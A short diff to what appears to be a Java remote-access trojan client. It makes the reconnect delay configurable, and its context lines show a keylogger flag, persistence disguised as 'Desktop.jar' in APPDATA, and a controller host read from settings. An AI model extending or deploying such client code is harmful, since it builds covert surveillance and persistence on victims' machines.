@@ -40,6 +40,7 @@ public class Client {
     private static boolean keyLogger = false;
     private static String persistenceDir = System.getenv("APPDATA")+ "\\Desktop.jar";
     private static String aesKey = "";
+    private static int waitTimeMillis = 1000;
 
     private static String keyLogFile = System.getProperty("java.io.tmpdir") + "log.txt";
 
@@ -470,7 +471,7 @@ public class Client {
             if (debugMode){
                 se.printStackTrace();
             }
-            Thread.sleep(1000);
+            Thread.sleep(waitTimeMillis);
             connect();
         } catch (Exception e) {
             if (debugMode){
@@ -603,7 +604,7 @@ public class Client {
                 stringBuilder.append(line);
             }
             String[] settings = stringBuilder.toString().split(" ");
-            if (settings.length == 8) {
+            if (settings.length == 9) {
                 HOST = (settings[0]);
                 // Change domain to ip
                 try{
@@ -633,6 +634,7 @@ public class Client {
                 if (!settings[7].equals("{{DEFAULT}}")) {
                     persistenceDir = settings[7];
                 }
+                waitTimeMillis = Integer.parseInt(settings[8]);
             }
         } catch (IOException e) {
             if (debugMode) {
